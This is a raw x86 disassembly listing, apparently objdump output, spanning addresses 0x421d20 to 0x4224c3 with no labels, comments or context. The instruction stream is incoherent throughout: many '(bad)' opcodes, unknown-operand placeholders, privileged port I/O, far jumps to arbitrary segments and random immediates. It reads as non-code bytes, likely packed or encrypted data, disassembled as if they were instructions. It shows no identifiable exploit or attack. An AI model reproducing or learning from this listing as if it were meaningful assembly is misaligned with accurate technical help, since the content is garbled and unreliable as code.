  421d20:	sar    BYTE PTR [edx+0x71dd5851],0x30
  421d27:	inc    ebx
  421d28:	in     eax,dx
  421d29:	stos   DWORD PTR es:[edi],eax
  421d2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421d2b:	es lods al,BYTE PTR gs:[esi]
  421d2e:	sub    BYTE PTR [ebx+0x77],dh
  421d31:	sub    al,0xad
  421d33:	jmp    0x421cde
  421d35:	sub    al,0x63
  421d37:	jmp    0x421dae
  421d39:	out    dx,al
  421d3a:	and    BYTE PTR [esi],bh
  421d3c:	xchg   BYTE PTR [edi+0x35],bh
  421d3f:	and    BYTE PTR [ecx-0x52],bh
  421d42:	pop    es
  421d43:	sub    ch,BYTE PTR [eax-0x69]
  421d46:	add    eax,0xb7310f3e
  421d4b:	jns    0x421d84
  421d4d:	daa    
  421d4e:	fwait
  421d4f:	add    al,0xdb
  421d51:	mov    dh,0xbd
  421d53:	fcomp  QWORD PTR [ecx-0x45]
  421d56:	mov    edi,0x154d88be
  421d5b:	in     al,0x50
  421d5d:	xchg   esp,eax
  421d5e:	fisub  DWORD PTR [ecx-0x69]
  421d61:	dec    esi
  421d62:	(bad)  
  421d64:	out    dx,al
  421d65:	or     eax,0x34480e82
  421d6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421d6b:	sahf   
  421d6c:	mov    esp,0x826e2bd9
  421d71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421d72:	cmc    
  421d73:	push   ds
  421d74:	mov    al,ds:0xdb7c69eb
  421d79:	cmp    eax,0xae94687
  421d7e:	aad    0x93
  421d80:	in     al,dx
  421d81:	div    BYTE PTR [edx-0x676a19e0]
  421d87:	aam    0x8a
  421d89:	mov    esp,0x2b5b432b
  421d8e:	jb     0x421d54
  421d90:	jg     0x421d5d
  421d92:	jmp    0x56178403
  421d97:	mov    ebp,0xae4b66ad
  421d9c:	inc    esp
  421d9d:	push   cs
  421d9e:	stos   BYTE PTR es:[edi],al
  421d9f:	jne    0x421dcf
  421da1:	mov    DWORD PTR [ebx+0x3d1e4a8b],esp
  421da7:	dec    eax
  421da8:	das    
  421da9:	jg     0x421dd2
  421dab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421dac:	enter  0xb68e,0xd
  421db0:	div    BYTE PTR [edx-0x1]
  421db3:	out    0x31,al
  421db5:	(bad)  
  421db6:	xchg   ebx,eax
  421db7:	repz jb 0x421e12
  421dba:	pop    esp
  421dbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421dbc:	dec    ebp
  421dbd:	test   DWORD PTR [ebx-0x7b870937],edx
  421dc3:	enter  0xf7a0,0x9e
  421dc7:	outs   dx,DWORD PTR ds:[esi]
  421dc8:	daa    
  421dc9:	mov    ebx,DWORD PTR [ebp+0x66]
  421dcc:	xchg   edi,eax
  421dcd:	fld    TBYTE PTR [eax+0x1997a29a]
  421dd3:	stos   DWORD PTR es:[edi],eax
  421dd4:	xor    al,0xa3
  421dd6:	mov    cl,al
  421dd8:	ins    BYTE PTR es:[edi],dx
  421dd9:	xor    DWORD PTR [ecx+0x74f8725b],0xffffffd8
  421de0:	adc    ecx,ebp
  421de2:	(bad)  
  421de3:	jmp    0x421d81
  421de5:	mov    BYTE PTR [eax+0x33729547],al
  421deb:	dec    edx
  421dec:	popf   
  421ded:	sub    al,0xa0
  421def:	outs   dx,DWORD PTR ds:[esi]
  421df0:	or     BYTE PTR [edi],dh
  421df2:	adc    BYTE PTR [ecx],bl
  421df4:	push   ebx
  421df5:	in     al,dx
  421df6:	stc    
  421df7:	pop    ebp
  421df8:	rol    BYTE PTR [eax-0x1e],cl
  421dfb:	int    0xc1
  421dfd:	jmp    0xf452:0x14cba07f
  421e04:	xchg   ebx,eax
  421e05:	inc    esp
  421e06:	arpl   WORD PTR [esi-0x2b783772],si
  421e0c:	into   
  421e0d:	pop    ecx
  421e0e:	jle    0x421e37
  421e10:	cld    
  421e11:	int3   
  421e12:	in     al,0x71
  421e14:	data16 sub ah,BYTE PTR [esp+ebx*2+0x74]
  421e19:	push   ds
  421e1a:	sub    bh,BYTE PTR [esi-0x4f]
  421e1d:	cmp    BYTE PTR [ecx],bh
  421e1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421e20:	cmova  ebp,DWORD PTR [esi+esi*1-0x73]
  421e25:	cli    
  421e26:	jmp    0xec99:0x4e4bf496
  421e2d:	repnz push ss
  421e2f:	call   0xdfa4ae6f
  421e34:	lods   eax,DWORD PTR ds:[esi]
  421e35:	mov    ebp,?
  421e37:	pop    ss
  421e38:	pop    edi
  421e39:	mov    ah,0xc4
  421e3b:	cmp    al,0x8f
  421e3d:	cmc    
  421e3e:	outs   dx,BYTE PTR ds:[esi]
  421e3f:	or     al,0x14
  421e41:	mov    DWORD PTR [edx*4+0x213f5d46],ebp
  421e48:	out    dx,al
  421e49:	ret    0x6d5b
  421e4c:	iret   
  421e4d:	shr    DWORD PTR [esi-0x33],cl
  421e50:	xor    dl,bh
  421e52:	fld    QWORD PTR [esi+edx*2-0x2028f79f]
  421e59:	or     eax,0xe8016594
  421e5e:	outs   dx,DWORD PTR ds:[esi]
  421e5f:	push   esp
  421e60:	repz mov WORD PTR [eax+edx*8+0x3a],cs
  421e65:	jg     0x421e93
  421e67:	ror    DWORD PTR [ebp+0x6b],cl
  421e6a:	adc    eax,edi
  421e6c:	stc    
  421e6d:	push   ebx
  421e6e:	adc    bl,BYTE PTR gs:0x7dafe7b5
  421e75:	idiv   DWORD PTR fs:[esi]
  421e78:	fdivr  DWORD PTR [ecx+0x5ce1ce70]
  421e7e:	int    0xa6
  421e80:	adc    cl,BYTE PTR [edx]
  421e82:	inc    edx
  421e83:	jmp    0x421e13
  421e85:	out    dx,eax
  421e86:	idiv   DWORD PTR [ecx+0x348257a0]
  421e8c:	adc    al,0x1e
  421e8e:	sub    bl,BYTE PTR ds:0x60a9dd16
  421e94:	ds or  al,0x43
  421e97:	sahf   
  421e98:	mov    dl,0x18
  421e9a:	jmp    0x421e85
  421e9c:	jl     0x421e64
  421e9e:	pop    ecx
  421e9f:	jns    0x421e2b
  421ea1:	mov    al,0x6d
  421ea3:	or     ch,al
  421ea5:	sbb    esi,edi
  421ea7:	xchg   ebx,eax
  421ea8:	xor    cl,dh
  421eaa:	xchg   ecx,eax
  421eab:	mov    al,ds:0x344e1f12
  421eb0:	gs aas 
  421eb2:	add    DWORD PTR [ebp-0x4b82a3f7],edx
  421eb8:	mov    al,0x85
  421eba:	loopne 0x421f32
  421ebc:	dec    ebx
  421ebd:	jmp    0x973d:0x3e7ac800
  421ec4:	adc    al,0xf
  421ec6:	jge    0x421ebc
  421ec8:	gs sbb bl,bl
  421ecb:	adc    DWORD PTR [edi+0x39],esi
  421ece:	arpl   ax,bp
  421ed0:	xchg   esp,eax
  421ed1:	sbb    DWORD PTR [edx],eax
  421ed3:	mov    ch,0x44
  421ed5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421ed6:	in     eax,dx
  421ed7:	xchg   esp,eax
  421ed8:	pop    ss
  421ed9:	pop    ecx
  421eda:	cwde   
  421edb:	test   BYTE PTR [edx+eax*2-0x4a],ch
  421edf:	jb     0x421f2f
  421ee1:	cdq    
  421ee2:	fistp  QWORD PTR [edx]
  421ee4:	pop    esp
  421ee5:	jne    0x421ee2
  421ee7:	loope  0x421e9b
  421ee9:	les    edi,FWORD PTR [ebp+ebp*8+0x5c]
  421eed:	dec    edx
  421eee:	mov    ecx,DWORD PTR [esi]
  421ef0:	fild   DWORD PTR [edi+0x46c0b63e]
  421ef6:	outs   dx,DWORD PTR ds:[esi]
  421ef7:	mov    bh,0x3b
  421ef9:	data16 fisub WORD PTR [edi]
  421efc:	popf   
  421efd:	jae    0x421e87
  421eff:	mov    ah,BYTE PTR [ebx+ebp*8+0x3ce363a6]
  421f06:	or     eax,0xc8b8d586
  421f0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421f0c:	sub    ebp,esi
  421f0e:	xchg   ecx,eax
  421f0f:	into   
  421f10:	push   es
  421f11:	xchg   ebx,eax
  421f12:	cmp    DWORD PTR [edx+0x170f5bae],eax
  421f18:	push   ss
  421f19:	jno    0x421f54
  421f1b:	sbb    al,0xe9
  421f1d:	jmp    0x4c11140e
  421f22:	inc    eax
  421f23:	es push edi
  421f25:	jae    0x421ebd
  421f27:	lahf   
  421f28:	push   edi
  421f29:	inc    edx
  421f2a:	pop    edi
  421f2b:	adc    BYTE PTR [ebx-0x14],al
  421f2e:	cmp    BYTE PTR [ecx],0x8a
  421f31:	mov    esp,0x1ccfc052
  421f36:	mov    ?,esi
  421f38:	cmp    ebx,ecx
  421f3a:	jo     0x421f11
  421f3c:	lods   al,BYTE PTR ds:[esi]
  421f3d:	out    dx,al
  421f3e:	jbe    0x421f32
  421f40:	sbb    esp,ecx
  421f42:	xor    al,0xd8
  421f44:	(bad)  
  421f45:	pop    eax
  421f46:	out    0xe6,al
  421f48:	cs jge 0x421f79
  421f4b:	je     0x421f5c
  421f4d:	mov    ds:0xa7c66498,al
  421f52:	les    ecx,FWORD PTR [ebx]
  421f54:	inc    eax
  421f55:	call   0x452ec911
  421f5a:	push   esi
  421f5b:	fcom   QWORD PTR [edi-0x49]
  421f5e:	shl    BYTE PTR [edx+0x901aac0],cl
  421f64:	and    BYTE PTR [ebp+0x340ac06f],0x49
  421f6b:	add    eax,DWORD PTR [ebx+ebx*4+0x14]
  421f6f:	sub    ch,BYTE PTR [eax-0x7a]
  421f72:	and    dh,BYTE PTR [ecx]
  421f74:	rcr    DWORD PTR [edx-0x6c152b],cl
  421f7a:	mov    ah,0xe
  421f7c:	inc    esp
  421f7d:	(bad)  
  421f7e:	cmc    
  421f7f:	ins    DWORD PTR es:[edi],dx
  421f80:	out    dx,eax
  421f81:	adc    ebx,ecx
  421f83:	inc    ebp
  421f84:	ss push edx
  421f86:	push   eax
  421f87:	jmp    0x422006
  421f89:	jns    0x422005
  421f8b:	jecxz  0x421fb0
  421f8d:	test   BYTE PTR [ebp+0x4f],ch
  421f90:	into   
  421f91:	jo     0x421f43
  421f93:	mov    ebp,0xd7489dfc
  421f98:	fnsave [ecx]
  421f9a:	rcl    BYTE PTR [ebx+0x57],1
  421f9d:	aas    
  421f9e:	xlat   BYTE PTR ds:[ebx]
  421f9f:	stc    
  421fa0:	cmp    DWORD PTR [ecx-0xe],0x71
  421fa4:	or     eax,0x499d769b
  421fa9:	inc    edi
  421faa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421fab:	pushf  
  421fac:	push   ebp
  421fad:	test   edx,edi
  421faf:	jge    0x421f3d
  421fb1:	sub    eax,DWORD PTR [esi]
  421fb3:	adc    eax,0x85ccee7d
  421fb8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421fb9:	imul   edx,DWORD PTR [ecx+ecx*4],0x1
  421fbd:	pop    esi
  421fbe:	jge    0x422034
  421fc0:	call   0x5c26:0xced0f431
  421fc7:	jl     0x422023
  421fc9:	push   eax
  421fca:	imul   esi,DWORD PTR [ecx+0x72],0xffffffd1
  421fce:	dec    ecx
  421fcf:	xchg   BYTE PTR [edi],cl
  421fd1:	jae    0x42202d
  421fd3:	xchg   edx,eax
  421fd4:	dec    ebp
  421fd5:	or     eax,0xa66c24fb
  421fda:	inc    esi
  421fdb:	mov    bh,0xdb
  421fdd:	adc    al,0x31
  421fdf:	xchg   edi,eax
  421fe0:	xor    BYTE PTR [eax+0x50],bl
  421fe3:	fucomi st,st(0)
  421fe5:	push   ebx
  421fe6:	push   es
  421fe7:	test   BYTE PTR [ebx+edi*1+0x5e],0x6c
  421fec:	popa   
  421fed:	sub    cl,al
  421fef:	dec    eax
  421ff0:	jmp    0x5ae0ec18
  421ff5:	dec    edi
  421ff6:	(bad)
  421ff9:	xchg   esp,eax
  421ffa:	fs jb  0x421fc7
  421ffd:	into   
  421ffe:	int3   
  421fff:	repnz xlat BYTE PTR ds:[ebx]
  422001:	lods   al,BYTE PTR ds:[esi]
  422002:	stos   BYTE PTR es:[edi],al
  422003:	imul   esp,DWORD PTR [edi+ebx*2+0x2f],0xffffff9e
  422008:	out    0x33,eax
  42200a:	pushf  
  42200b:	iretw  
  42200d:	dec    edi
  42200e:	cli    
  42200f:	lods   al,BYTE PTR ds:[esi]
  422010:	imul   DWORD PTR [edx]
  422012:	lea    ecx,[eax+ebx*4-0x39]
  422016:	(bad)  
  422017:	dec    esp
  422018:	cmp    al,dl
  42201a:	rcr    DWORD PTR [edx+ebx*4-0x247b2136],cl
  422021:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422022:	in     eax,0xcd
  422024:	test   al,0xd9
  422026:	les    edi,FWORD PTR [edi+0x54]
  422029:	hlt    
  42202a:	or     BYTE PTR [edi+0x1c],bl
  42202d:	jp     0x421fb3
  42202f:	pop    esp
  422030:	into   
  422031:	inc    edi
  422032:	mov    WORD PTR [ecx+0x78c900d0],es
  422038:	add    ebp,DWORD PTR [edx+edi*2]
  42203b:	pop    edx
  42203c:	pop    es
  42203d:	adc    ebp,DWORD PTR [esi+0x62801e4d]
  422043:	sar    edx,0xe2
  422046:	ins    BYTE PTR es:[edi],dx
  422047:	sbb    eax,0x9b9461ae
  42204c:	pop    es
  42204d:	adc    al,bh
  42204f:	(bad)  
  422050:	(bad)  
  422051:	lods   al,BYTE PTR ds:[esi]
  422052:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422053:	adc    ah,0xae
  422056:	mov    edi,0xecd867b
  42205b:	ror    DWORD PTR [edi-0xaecaab0],0xb0
  422062:	lods   eax,DWORD PTR ds:[esi]
  422063:	mov    DWORD PTR [edi],ecx
  422065:	imul   BYTE PTR [ebp-0x6aca16f2]
  42206b:	mov    ebp,0xb2dc6c4
  422070:	enter  0x9251,0x89
  422074:	mov    ebp,DWORD PTR [esi]
  422076:	pop    ebp
  422077:	xor    BYTE PTR ss:[edi+0x70],al
  42207b:	test   ebp,edi
  42207d:	in     eax,dx
  42207e:	repz xor al,0xde
  422081:	pop    ebp
  422082:	sub    al,0x11
  422084:	and    DWORD PTR [ebx-0x46],ebp
  422087:	lahf   
  422088:	arpl   di,si
  42208a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42208b:	(bad)  
  42208c:	mov    eax,ds:0xdd40a06d
  422091:	pop    ecx
  422092:	jmp    DWORD PTR [edx+0x8]
  422095:	mov    esi,0x51ffbeb8
  42209a:	scas   al,BYTE PTR es:[edi]
  42209b:	outs   dx,DWORD PTR ds:[esi]
  42209c:	xor    dh,BYTE PTR [ebx]
  42209e:	(bad)  
  42209f:	shl    BYTE PTR [edx],cl
  4220a1:	ret    0xf70a
  4220a4:	lea    eax,[esi+0x67]
  4220a7:	pushf  
  4220a8:	xor    eax,0xeb168bef
  4220ad:	mov    esi,esp
  4220af:	xchg   edi,eax
  4220b0:	cmp    DWORD PTR [esi],ecx
  4220b2:	inc    BYTE PTR [edx-0x4de68ed]
  4220b8:	shl    ah,0x9e
  4220bb:	sub    DWORD PTR [ebx-0xb772c5c],esp
  4220c1:	xor    ebp,DWORD PTR [ecx+eax*4-0x39]
  4220c5:	fcomp  DWORD PTR [ebp+ebp*1-0x364f0bf6]
  4220cc:	fstp   DWORD PTR ds:0xad842219
  4220d2:	shr    BYTE PTR [ebp+0x8c24afe],cl
  4220d8:	and    BYTE PTR [esi],0x78
  4220db:	sbb    eax,0x95324c94
  4220e0:	and    eax,DWORD PTR ds:0x203090ea
  4220e6:	ss sahf 
  4220e8:	nop
  4220e9:	les    edi,FWORD PTR [edx+0x1e]
  4220ec:	push   eax
  4220ed:	repz in eax,0xc3
  4220f0:	xchg   edi,eax
  4220f1:	xchg   edi,eax
  4220f2:	call   0x46301e6f
  4220f7:	aam    0x3f
  4220f9:	addr16 jmp 0xfb41:0x8341e4dc
  422101:	loop   0x42215b
  422103:	jmp    0x422131
  422105:	sub    al,0x5c
  422107:	push   es
  422108:	daa    
  422109:	jl     0x4220db
  42210b:	mov    ecx,0xa2dc5a96
  422110:	push   esi
  422111:	and    BYTE PTR [eax-0x2dd4461d],bl
  422117:	je     0x422122
  422119:	pop    DWORD PTR [ecx+ecx*8]
  42211c:	stos   BYTE PTR es:[edi],al
  42211d:	mov    BYTE PTR [esi],bh
  42211f:	mov    bh,0xeb
  422121:	inc    ecx
  422122:	or     cl,BYTE PTR [eax]
  422124:	pop    ecx
  422125:	cmp    al,0x7d
  422127:	and    al,0x9c
  422129:	or     BYTE PTR [eax+0x48],bh
  42212c:	push   ecx
  42212d:	in     al,dx
  42212e:	cmp    al,0xb9
  422130:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422131:	jbe    0x422178
  422133:	int3   
  422134:	mov    edx,0x66a4ecf9
  422139:	int3   
  42213a:	fmul   DWORD PTR [esi-0x6e5c9abf]
  422140:	xchg   BYTE PTR fs:[esp+esi*4-0x2049724],dl
  422148:	not    edx
  42214a:	cmp    eax,0xaf3341c
  42214f:	inc    edi
  422150:	sbb    ah,bl
  422152:	cdq    
  422153:	scas   al,BYTE PTR es:[edi]
  422154:	mov    ?,WORD PTR [edi]
  422156:	(bad)  
  422157:	cli    
  422158:	sub    ecx,eax
  42215a:	mov    DWORD PTR [eax+ebp*8+0x54],esi
  42215e:	jnp    0x42219e
  422160:	xchg   ebp,ebp
  422162:	adc    al,0xf6
  422164:	sub    esi,DWORD PTR [edx-0x18]
  422167:	cld    
  422168:	bound  edx,QWORD PTR [ebp-0x16b7a743]
  42216e:	dec    ebx
  42216f:	call   0x7a24a38c
  422174:	jns    0x422112
  422176:	stos   BYTE PTR es:[edi],al
  422177:	daa    
  422178:	test   cl,dl
  42217a:	out    0xe,eax
  42217c:	shr    dl,0x3e
  42217f:	jae    0x42219b
  422181:	sub    bh,ch
  422183:	push   edi
  422184:	sti    
  422185:	loope  0x4221f1
  422187:	inc    ebp
  422188:	push   ss
  422189:	inc    ebx
  42218a:	pop    es
  42218b:	mov    es,ecx
  42218d:	jmp    0x4221ae
  42218f:	prefetch (bad)
  422190:	or     eax,0x7a2ad9f2
  422195:	xchg   ebp,eax
  422196:	adc    esp,edi
  422198:	fsubr  st(2),st
  42219a:	add    esp,0xe78515dd
  4221a0:	or     ebx,edx
  4221a2:	xchg   BYTE PTR [eax+ebx*8-0x6c],bh
  4221a6:	dec    edx
  4221a7:	mov    edx,0xe4c2dfdb
  4221ac:	mov    bh,BYTE PTR [edi+0x72dcf91]
  4221b2:	dec    edi
  4221b3:	push   edx
  4221b4:	pop    gs
  4221b6:	int3   
  4221b7:	lds    edx,FWORD PTR [edx-0x61e9d52c]
  4221bd:	mov    bh,0x2a
  4221bf:	jle    0x4221bd
  4221c1:	cwde   
  4221c2:	push   ss
  4221c3:	pop    edi
  4221c4:	imul   ebp,DWORD PTR [esp+ebp*1],0x20b01333
  4221cb:	ficomp DWORD PTR ds:0x5246367d
  4221d1:	sbb    esp,DWORD PTR [esi+ebp*2-0x17]
  4221d5:	sub    ebp,DWORD PTR [ebx-0x16721420]
  4221db:	mov    ch,0xd6
  4221dd:	mov    ecx,DWORD PTR fs:[edi+0x57]
  4221e1:	cli    
  4221e2:	outs   dx,DWORD PTR ds:[esi]
  4221e3:	test   DWORD PTR [edi+0x341734e5],edx
  4221e9:	mov    ebp,DWORD PTR [edx+0x6dc903f9]
  4221ef:	xor    al,0x24
  4221f1:	pop    ebx
  4221f2:	in     al,0xf5
  4221f4:	les    ebp,FWORD PTR [ecx]
  4221f6:	into   
  4221f7:	scas   al,BYTE PTR es:[edi]
  4221f8:	pop    eax
  4221f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4221fa:	test   al,0x8c
  4221fc:	push   esi
  4221fd:	or     al,0x8
  4221ff:	neg    BYTE PTR [ebx]
  422201:	mov    al,ds:0xa1417cc6
  422206:	inc    edx
  422207:	xor    BYTE PTR [ecx-0x14971d16],0x15
  42220e:	or     BYTE PTR ds:0x2f3f964f,0x9c
  422215:	mov    ah,0xb4
  422217:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422218:	ret    
  422219:	and    BYTE PTR [edi-0x6240dee6],dl
  42221f:	pop    ss
  422220:	adc    al,0x43
  422222:	sbb    edi,eax
  422224:	pop    esi
  422225:	or     edi,DWORD PTR [ecx+0x6c]
  422228:	rcl    DWORD PTR ds:0xe47d1d4b,1
  42222e:	cmp    al,0x6b
  422230:	scas   eax,DWORD PTR es:[edi]
  422231:	enter  0x465a,0x3e
  422235:	test   BYTE PTR ds:0x2125ac83,ch
  42223b:	jb     0x422250
  42223d:	cmc    
  42223e:	mov    ds:0x4d3cfd2c,eax
  422243:	popa   
  422244:	xor    eax,0xd5a3006c
  422249:	stos   DWORD PTR es:[edi],eax
  42224a:	popf   
  42224b:	mov    esp,0x7fdf1d6
  422250:	cmp    DWORD PTR [ebx+0x186556c1],0x5a
  422257:	pushf  
  422258:	cmp    eax,0x7e52301b
  42225d:	or     eax,0xbf42b2a8
  422262:	mov    esi,0x22a958a2
  422267:	test   eax,0xf3c4b89c
  42226c:	mov    eax,ds:0xd4ca5bc6
  422271:	mov    ah,0x21
  422273:	push   ebx
  422274:	mov    eax,0xe80f83f8
  422279:	jo     0x4222e8
  42227b:	jae    0x42223b
  42227d:	lods   eax,DWORD PTR ds:[esi]
  42227e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42227f:	jmp    0x9ae8:0x3b9caeb5
  422286:	mov    BYTE PTR [edx-0x503532a6],dh
  42228c:	jmp    0x319a:0x337786b6
  422293:	ret    
  422294:	xchg   edx,eax
  422295:	imul   esi,DWORD PTR [ecx-0x7f],0x6c
  422299:	cvtps2pd xmm0,QWORD PTR [ebx+0x34]
  42229d:	fs mov ah,0xe8
  4222a0:	mov    bh,0xe
  4222a2:	sub    ah,BYTE PTR [esp+eax*2]
  4222a5:	mov    eax,ds:0x84b416c5
  4222aa:	retf   0x5b15
  4222ad:	sub    eax,0xc048fc1
  4222b2:	xor    ch,ah
  4222b4:	pop    eax
  4222b5:	retf   
  4222b6:	mov    al,ds:0xa111d408
  4222bb:	inc    esp
  4222bc:	std    
  4222bd:	aam    0xe9
  4222bf:	push   esi
  4222c0:	fadd   DWORD PTR [esi+esi*8+0x603f629f]
  4222c7:	pop    edi
  4222c8:	stc    
  4222c9:	test   BYTE PTR [ebx],cl
  4222cb:	je     0x4222ed
  4222cd:	ror    ch,cl
  4222cf:	imul   ecx,ebp,0xfe33ccb5
  4222d5:	cwde   
  4222d6:	or     eax,0x896fccfa
  4222db:	mov    bl,0xb0
  4222dd:	sbb    DWORD PTR [ebx+0x2d],0xa734a6f4
  4222e4:	out    dx,eax
  4222e5:	outs   dx,DWORD PTR ds:[esi]
  4222e6:	cld    
  4222e7:	data16 jnp 0x422359
  4222ea:	cwde   
  4222eb:	dec    edx
  4222ec:	leave  
  4222ed:	inc    ebp
  4222ee:	mov    BYTE PTR [esi+0x5f],al
  4222f1:	or     DWORD PTR [eax+0x561e5927],esi
  4222f7:	mov    ah,0x33
  4222f9:	mov    edx,0x22f963c8
  4222fe:	test   al,0x27
  422300:	stos   BYTE PTR es:[edi],al
  422301:	push   ecx
  422302:	xlat   BYTE PTR ds:[ebx]
  422303:	push   ebx
  422304:	pop    edx
  422305:	xchg   esi,eax
  422306:	aas    
  422307:	(bad)  
  422308:	(bad)  
  422309:	retf   0xab88
  42230c:	outs   dx,DWORD PTR ds:[esi]
  42230d:	mov    dl,0x6c
  42230f:	inc    edi
  422310:	leave  
  422311:	(bad)  
  422312:	cmc    
  422313:	mov    BYTE PTR [esi+0xb8eca8],0x88
  42231a:	push   0xffffffe3
  42231c:	inc    edx
  42231d:	sar    BYTE PTR [ebp+esi*4+0x6bedfe5b],1
  422324:	lahf   
  422325:	into   
  422326:	mov    ecx,esi
  422328:	xchg   ebx,eax
  422329:	cs inc ebx
  42232b:	daa    
  42232c:	cmp    ch,BYTE PTR [edx]
  42232e:	(bad)  
  42232f:	out    dx,al
  422330:	gs xor eax,0x2829c6b5
  422336:	sti    
  422337:	jno    0x42239b
  422339:	out    dx,al
  42233a:	(bad)  
  42233b:	or     DWORD PTR ds:0x83a34d5,ebx
  422341:	mov    ebx,0xad0a2d36
  422346:	xchg   edx,eax
  422347:	adc    eax,0x2287ee2c
  42234c:	push   es
  42234d:	and    DWORD PTR [ebx-0x36c2b077],edi
  422353:	pop    es
  422354:	(bad)
  422358:	into   
  422359:	push   edx
  42235a:	int3   
  42235b:	add    bl,al
  42235d:	aam    0x92
  42235f:	icebp  
  422360:	add    al,BYTE PTR [ebx+0x60]
  422363:	test   DWORD PTR [eax+edx*4-0x3e4ff745],0xacd535fe
  42236e:	inc    eax
  42236f:	out    dx,eax
  422370:	push   ds
  422371:	push   cs
  422372:	xchg   BYTE PTR [ecx+0x6ee4d487],dh
  422378:	pusha  
  422379:	or     DWORD PTR [ecx],ebp
  42237b:	mov    edi,0xa4e1adac
  422380:	mul    DWORD PTR [eax]
  422382:	nop
  422383:	mov    esi,0xa2d3c3c7
  422388:	jecxz  0x422338
  42238a:	dec    ebp
  42238b:	sbb    BYTE PTR [esi-0x21],bh
  42238e:	xchg   esi,eax
  42238f:	xchg   ebp,eax
  422390:	call   0x973cc703
  422395:	mov    eax,ds:0xcbf1098b
  42239a:	rcl    DWORD PTR [ebx],1
  42239c:	cli    
  42239d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42239e:	adc    edi,eax
  4223a0:	jecxz  0x422346
  4223a2:	or     al,0xdb
  4223a4:	adc    bh,BYTE PTR [ebp+0x2b]
  4223a7:	repnz sub eax,ebx
  4223aa:	sub    DWORD PTR [eax+0x60635971],0x30
  4223b1:	inc    esp
  4223b2:	test   eax,0xf8f08f81
  4223b7:	ja     0x4223e3
  4223b9:	cmp    esp,DWORD PTR [eax-0x46]
  4223bc:	fidiv  DWORD PTR [eax+0x6d]
  4223bf:	and    ah,BYTE PTR [ecx-0x53]
  4223c2:	push   cs
  4223c3:	push   ebx
  4223c4:	ret    
  4223c5:	cli    
  4223c6:	push   ebx
  4223c7:	inc    edi
  4223c8:	mov    ds:0x1b39eed8,al
  4223cd:	jnp    0x4223f3
  4223cf:	dec    ebx
  4223d0:	add    eax,0x69fa2e0e
  4223d5:	sub    dh,BYTE PTR [ecx]
  4223d7:	out    0xe8,eax
  4223d9:	(bad)  
  4223da:	call   0xc925f632
  4223df:	dec    DWORD PTR [eax]
  4223e1:	mov    esp,0x2ced87fe
  4223e6:	sbb    BYTE PTR [edx+0x4c],dl
  4223e9:	loop   0x4223d6
  4223eb:	pushf  
  4223ec:	sahf   
  4223ed:	inc    ebx
  4223ee:	ret    
  4223ef:	aad    0xb9
  4223f1:	sbb    al,0x2
  4223f3:	mov    ds:0xf2a3f017,al
  4223f8:	not    cl
  4223fa:	pop    ecx
  4223fb:	or     edx,DWORD PTR [ebp-0x26a20da2]
  422401:	dec    esp
  422402:	inc    ecx
  422403:	into   
  422404:	xor    edx,DWORD PTR [ebx+0x671b28b6]
  42240a:	mov    esp,0x731c6294
  42240f:	pop    esi
  422410:	dec    ebx
  422411:	sub    eax,0xfb46e635
  422416:	sbb    ecx,DWORD PTR [eax+0x5a]
  422419:	pusha  
  42241a:	and    BYTE PTR [esi+0xaed4baa],bh
  422420:	cld    
  422421:	repnz mov BYTE PTR [ebx],bh
  422424:	sub    edx,esp
  422426:	push   0xadb26d1f
  42242b:	add    BYTE PTR [ecx],dl
  42242d:	add    DWORD PTR [ebx+esi*1-0x44394d51],0x24
  422435:	sub    DWORD PTR ds:0xff6fd5a4,0xce051312
  42243f:	cmp    al,0xdb
  422441:	xchg   edi,eax
  422442:	rcl    DWORD PTR [ebx-0x6c],cl
  422445:	mov    ecx,0x1edb2d00
  42244a:	push   0xffffffdf
  42244c:	push   0x2e501cb4
  422451:	test   dl,ah
  422453:	xchg   esi,eax
  422454:	pop    esi
  422455:	xor    al,0x64
  422457:	jb     0x42247f
  422459:	xchg   edx,eax
  42245a:	add    edi,DWORD PTR [ebp+0x6b]
  42245d:	dec    edi
  42245e:	push   ebx
  42245f:	call   0xb8ba:0x9b804dfc
  422466:	addr16 dec edi
  422468:	hlt    
  422469:	sbb    DWORD PTR [edx+0x7f9ff361],esi
  42246f:	retf   
  422470:	push   esi
  422471:	or     DWORD PTR [edi-0x51],esp
  422474:	fstp   QWORD PTR [ecx+0x30ebeff3]
  42247a:	inc    edx
  42247b:	sub    al,0x9b
  42247d:	fdiv   DWORD PTR [ecx]
  42247f:	(bad)  
  422480:	ja     0x422441
  422482:	sbb    BYTE PTR [edx+0x3070a63c],0xc1
  422489:	cs push es
  42248b:	fs out dx,eax
  42248d:	jg     0x422471
  42248f:	daa    
  422490:	aam    0xa0
  422492:	stc    
  422493:	push   ecx
  422494:	pushf  
  422495:	mov    edx,0x99351dd6
  42249a:	adc    eax,edx
  42249c:	xor    BYTE PTR [ebp-0x21],dl
  42249f:	push   ss
  4224a0:	pop    edx
  4224a1:	addr16 (bad) 
  4224a4:	inc    eax
  4224a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4224a6:	add    esp,DWORD PTR [edx+0x1a43b4fc]
  4224ac:	lock daa 
  4224ae:	imul   eax,DWORD PTR [esp+edx*1-0x68],0xffffffad
  4224b3:	call   DWORD PTR [esi+0x671da517]
  4224b9:	out    dx,al
  4224ba:	jmp    0x422535
  4224bc:	sbb    BYTE PTR [edi+esi*8],ah
  4224bf:	xchg   ecx,eax
  4224c0:	xor    cl,dh
  4224c2:	in     eax,dx
  4224c3:	mov    bh,BYTE PTR [esi]
